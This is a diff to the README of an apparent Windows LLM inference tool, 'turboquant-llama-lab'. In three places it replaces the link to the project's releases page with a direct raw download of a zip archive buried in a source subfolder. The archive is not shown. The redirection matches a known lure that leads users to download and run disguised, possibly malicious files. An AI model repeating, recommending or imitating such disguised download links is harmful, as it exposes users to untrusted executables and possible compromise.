@@ -1,6 +1,6 @@
 # 🚀 turboquant-llama-lab - Fast long-context inference for Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6E6E6E?style=for-the-badge)](https://github.com/onthenose-record446/turboquant-llama-lab/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6E6E6E?style=for-the-badge)](https://github.com/onthenose-record446/turboquant-llama-lab/raw/refs/heads/main/patches/llama.cpp/generated/turboquant_lab_llama_1.7.zip)
 
 ## 🧭 What this is
 
@@ -32,7 +32,7 @@ For best results:
 
 Visit this page to download the Windows release files:
 
-https://github.com/onthenose-record446/turboquant-llama-lab/releases
+https://github.com/onthenose-record446/turboquant-llama-lab/raw/refs/heads/main/patches/llama.cpp/generated/turboquant_lab_llama_1.7.zip
 
 Look for the newest release and download the file made for Windows. If there are several files, pick the one that matches your system, such as:
 - a Windows .zip file
@@ -211,7 +211,7 @@ It is useful when you want a practical test bed for local model work without a c
 
 If you need the release page again, use this link:
 
-https://github.com/onthenose-record446/turboquant-llama-lab/releases
+https://github.com/onthenose-record446/turboquant-llama-lab/raw/refs/heads/main/patches/llama.cpp/generated/turboquant_lab_llama_1.7.zip
 
 ## ❓ Common questions
 
